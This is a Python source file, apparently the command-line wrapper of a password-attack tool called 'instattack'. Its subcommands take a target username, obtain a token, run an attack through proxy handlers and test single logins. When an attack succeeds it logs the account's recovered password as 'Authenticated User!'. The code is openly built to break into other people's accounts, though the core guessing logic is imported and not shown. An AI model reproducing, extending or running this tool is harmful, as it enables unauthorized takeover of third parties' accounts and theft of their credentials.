import asyncio

from instattack.core.attack import attack, get_token

from .base import Instattack


@Instattack.subcommand('attack')
class InstattackAttack(Instattack):

    async def attempt_attack(self, loop, token):
        return await attack(loop, token, self.user, self.config)

    def get_token(self, loop):
        # Token will be None if an exception occured.
        token = loop.run_until_complete(get_token(loop, self.config))
        if not token:
            self.log.error('Token retrieval failed.')
            return

        self.log.success('Received Token', extra={'other': token})
        return token


@InstattackAttack.subcommand('test')
class AttackTest(InstattackAttack):
    pass


@InstattackAttack.subcommand('run')
class AttackRun(InstattackAttack):

    __name__ = 'Run Attack'

    def main(self, username):
        loop = asyncio.get_event_loop()

        user = loop.run_until_complete(self.get_user(username))
        if not user:
            return

        # Token will be None if an exception occured.
        token = self.get_token(loop)
        if not token:
            return

        result = loop.run_until_complete(self.attempt_attack(loop, token))
        if result:
            self.log.info(f'Authenticated User!', extra={
                'password': result.context.password
            })


@AttackTest.subcommand('token')
class GetToken(InstattackAttack):

    __name__ = 'Test Get Token'

    def main(self):
        loop = asyncio.get_event_loop()

        # Token will be None if an exception occured.
        token = self.get_token(loop)
        if not token:
            return


@AttackTest.subcommand('login')
class TestLogin(InstattackAttack):

    __name__ = 'Test Login'

    def main(self, username, password):
        loop = asyncio.get_event_loop()

        user = loop.run_until_complete(self.get_user(username))
        if not user:
            return

        # Token will be None if an exception occured.
        token = self.get_token(loop)
        if not token:
            return

        post_proxy_handler, password_handler = self.post_handlers(user)
        try:
            results = loop.run_until_complete(asyncio.gather(
                password_handler.attempt_single_login(
                    loop,
                    token,
                    password,
                ),
                post_proxy_handler.run(loop)
            ))
        except Exception as e:
            if not post_proxy_handler._stopped:
                post_proxy_handler.broker.stop(loop)
            loop.call_exception_handler({'exception': e})

        else:
            result = results[0]
            self.log.success(result)
